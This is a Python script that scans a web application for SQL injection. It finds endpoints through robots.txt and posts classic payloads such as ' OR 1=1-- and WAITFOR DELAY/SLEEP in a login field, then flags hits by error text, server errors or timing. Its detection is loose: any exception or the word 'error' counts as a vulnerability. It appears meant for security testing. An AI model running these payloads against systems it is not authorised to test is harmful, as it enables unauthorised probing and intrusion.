# sql_injection_concurrent_improved.py
import sys
import logging
import re
import requests
from urllib.parse import urljoin, urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed

class SQLInjectionTester:
    """
    Flexible concurrent SQL Injection testing framework.

    Auto-discovers endpoints via robots.txt or uses common defaults.

    Usage:
        python sql_injection_concurrent_improved.py <base_url> [endpoints...]

    Example:
        python sql_injection_concurrent_improved.py http://127.0.0.1:5000 /login /search
    """
    ERROR_PATTERNS = [
        re.compile(p, re.IGNORECASE) for p in [
            r"sql syntax.*?mysql", r"warning.*?mysql",
            r"unclosed quotation mark after the character string",
            r"quoted string not properly terminated", r"error", r"mysql", r"syntax"
        ]
    ]
    COMMON_ENDPOINTS = ['/', '/login', '/search', '/register', '/api/login-json']
    DEFAULT_PARAMS = {'username': 'admin', 'password': 'pass'}

    def __init__(
        self,
        base_url: str,
        endpoints: list[str] = None,
        timeout: float = 5.0,
        max_workers: int = 10
    ):
        # Normalize base URL
        parsed = urlparse(base_url)
        scheme = parsed.scheme or 'http'
        netloc = parsed.netloc or parsed.path
        self.base_url = f"{scheme}://{netloc.rstrip('/')}/"

        self.session = requests.Session()
        self.timeout = timeout
        self.max_workers = max_workers

        # Configure HTTPAdapter with connection pool
        from requests.adapters import HTTPAdapter
        adapter = HTTPAdapter(pool_connections=max_workers, pool_maxsize=max_workers)
        self.session.mount('http://', adapter)
        self.session.mount('https://', adapter)

        # Determine endpoints to test
        if endpoints:
            self.endpoints = endpoints
        else:
            discovered = self._discover_endpoints()
            self.endpoints = discovered if discovered else self.COMMON_ENDPOINTS

        # Default form parameters
        self.params = self.DEFAULT_PARAMS.copy()

        # Descriptive payloads
        self.payloads = {
            'Single Quote Injection': "'",
            'Double Quote Injection': '"',
            'Inline Comment Injection': '/* comment */',
            'Dash Comment Injection': '-- ',
            'Open Parenthesis Injection': '(',
            'Close Parenthesis Injection': ')',
            'Always-True Boolean Injection': "' OR 1=1-- ",
            'Always-False Boolean Injection': "' AND 1=2-- ",
            'Time Delay Injection': "' WAITFOR DELAY '0:0:5'-- ",
            'Sleep Injection': "' SLEEP(5)-- ",
            'Time Delay (False) Injection': "' WAITFOR DELAY '0:0:0'-- ",
            'Sleep (False) Injection': "' SLEEP(0)-- "
        }

    def _discover_endpoints(self) -> list[str]:
        """Fetch and parse /robots.txt for Disallow paths."""
        try:
            resp = self.session.get(urljoin(self.base_url, 'robots.txt'), timeout=self.timeout)
            paths = []
            if resp.status_code == 200:
                for line in resp.text.splitlines():
                    if line.lower().startswith('disallow:'):
                        path = line.split(':', 1)[1].strip()
                        if path and '*' not in path:
                            paths.append(path)
            return sorted(set(paths))
        except Exception:
            return []

    def _build_url(self, endpoint: str) -> str:
        return urljoin(self.base_url, endpoint.lstrip('/'))

    def _detect_error(self, text: str) -> bool:
        """Check response text against known SQL error patterns."""
        return any(pattern.search(text) for pattern in self.ERROR_PATTERNS)

    def _run_test(self, endpoint: str, payload_name: str, payload: str) -> tuple[str, bool]:
        """Execute injection test against a single endpoint with a payload."""
        url = self._build_url(endpoint)
        data = self.params.copy()
        data['username'] = payload
        try:
            resp = self.session.post(url, data=data, timeout=self.timeout)
            body = resp.text
            # Error-based detection
            if resp.status_code >= 500 or self._detect_error(body):
                return payload_name, True
            # Time-based detection
            if 'Delay' in payload_name or 'Sleep' in payload_name:
                if resp.elapsed.total_seconds() >= self.timeout - 0.5:
                    return payload_name, True
        except Exception as e:
            logging.warning(f"Error testing {endpoint} with {payload_name}: {e}")
            return payload_name, True
        return payload_name, False

    def run_tests(self) -> None:
        """Run all configured payload tests concurrently and print summary."""
        print(f"Testing SQL Injection on: {self.base_url}\n")
        results = {name: False for name in self.payloads}
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = []
            for endpoint in self.endpoints:
                for name, payload in self.payloads.items():
                    futures.append(executor.submit(self._run_test, endpoint, name, payload))
            for future in as_completed(futures):
                name, vuln = future.result()
                if vuln:
                    results[name] = True
        # Output final results
        for name, vuln in results.items():
            print(f"{name:30s} - vulnerability : {vuln}")

if __name__ == '__main__':
    logging.basicConfig(level=logging.WARNING)
    if len(sys.argv) < 2:
        print(SQLInjectionTester.__doc__)
        sys.exit(1)
    base = sys.argv[1]
    endpoints = sys.argv[2:] if len(sys.argv) > 2 else None
    tester = SQLInjectionTester(base, endpoints=endpoints)
    tester.run_tests()
